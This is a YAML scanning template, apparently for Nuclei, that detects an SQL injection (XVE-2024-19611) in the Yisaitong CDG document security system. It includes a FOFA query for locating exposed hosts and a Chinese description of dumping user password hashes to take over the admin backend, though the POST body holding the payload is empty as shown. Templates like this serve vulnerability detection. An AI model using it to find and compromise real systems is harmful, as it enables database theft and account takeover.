http:
    - matchers:
        - part: body
          type: word
          words:
            - MEOGCAKA
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST /CDGServer3/CDGAuthoriseTempletService1 HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
          Content-Type: application/xml

          
id: yisaitong-CDGAuthoriseTempletService1-sql
info:
    author: Superhero
    description: |-
        fofa: body="/CDGServer3/index.jsp"
        某赛通电子文档安全管理系统的 CDGAuthoriseTempletService1 接口存在 SQL 注入漏洞。 攻击者可以通过构造特定的 POST 请求注入恶意 SQL 代码，利用该漏洞对数据库执行任意 SQL 操作，获取所有用户的账户密码信息，破解md5值后可直接接管后台，导致系统处于极不安全的状态。
    name: 亿赛通电子文档安全管理系统 CDGAuthoriseTempletService1 SQL注入漏洞(XVE-2024-19611)
    reference:
        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486211&idx=1&sn=582c581dbf632c105f88192a46f0c8ae&chksm=c267be30f5103726590a8b90a6b6ed82444feffb71c43387261b8615aef2f7069ec143327e3e&token=1742030890&lang=zh_CN#rd
    severity: high
    tags: []
